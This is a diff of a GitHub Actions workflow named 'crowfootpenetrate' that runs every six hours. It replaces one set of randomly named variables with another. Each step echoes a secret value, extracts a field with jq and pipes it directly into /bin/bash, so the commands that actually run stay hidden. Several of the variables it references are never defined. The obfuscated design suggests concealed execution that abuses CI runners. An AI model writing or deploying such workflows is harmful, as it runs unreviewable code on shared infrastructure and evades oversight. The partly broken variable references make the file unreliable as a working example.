@@ -3,29 +3,20 @@ name: crowfootpenetrate
 on:
   workflow_dispatch:
   schedule:
-    - cron: '27 5/6 * * *'
+    - cron: '24 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: crowfootpenetrate
         env:
-          utmjz2478: ${{ secrets.utmjz2478 }}
+          pal40754: ${{ secrets.pal40754 }}
         run: |
-          echo $utmjz2478 | jq -r .qmtiu8 | /bin/bash
-          echo $p96137 | jq -r .b6 | /bin/bash
-          echo $cw6081 | jq -r .d10 | /bin/bash
-          echo $fnz285 | jq -r .npu467 | /bin/bash
-          echo $qw0 | jq -r .seyxv0270 | /bin/bash
-          echo $hvm669 | jq -r .fozto5399 | /bin/bash
-          echo $hf866 | jq -r .naz6 | /bin/bash
-          echo $g7124 | jq -r .troxz51 | /bin/bash
-          echo $yw2 | jq -r .h942 | /bin/bash
-          echo $f5 | jq -r .j4 | /bin/bash
-          echo $kua2 | jq -r .d3 | /bin/bash
-          echo $df40 | jq -r .gsw8565 | /bin/bash
-          echo $bmbj8 | jq -r .ollwd902 | /bin/bash
-          echo $endln2 | jq -r .gsrc3234 | /bin/bash
+          echo $pal40754 | jq -r .lnoit18903 | /bin/bash
+          echo $qk444 | jq -r .xsyg200 | /bin/bash
+          echo $cykg18 | jq -r .efug0035 | /bin/bash
+          echo $qagcg53858 | jq -r .slf42739 | /bin/bash
+          echo $pgf06976 | jq -r .m38819 | /bin/bash
 
